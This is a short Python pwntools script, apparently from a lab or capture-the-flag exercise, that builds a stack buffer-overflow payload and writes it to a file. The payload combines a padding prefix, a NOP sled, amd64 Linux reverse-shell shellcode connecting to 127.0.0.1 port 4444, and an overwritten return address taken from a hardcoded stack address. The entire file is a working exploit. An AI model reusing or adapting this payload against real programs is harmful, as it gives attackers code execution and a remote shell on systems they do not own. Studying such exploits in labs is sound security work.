from pwn import *

context.arch='amd64' # 64-bit version of x86
context.os='linux'

offset = 551
nop_sled_offset = 256
nop_num = 64

# Return address in little-endian format
ret_addr =  0x7fffffffda88 - offset + nop_sled_offset
addr = p64(ret_addr, endian='little')

# Opcode for the NOP instruction (for NOP sled)
nop = asm('nop')
# Get assembly shell code
s_code = shellcraft.amd64.linux.connect('127.0.0.1', 4444) + shellcraft.amd64.linux.dupsh('rbp') 
s_code_asm = asm(s_code)

# First part of the payload
payload = b"2\n" + b"A"*1022
# Second part of the payload
payload += nop*(offset - len(s_code_asm) - nop_num) + s_code_asm + nop*nop_num + addr 


with open("./shellcode_payload", "wb") as f:
 f.write(payload)
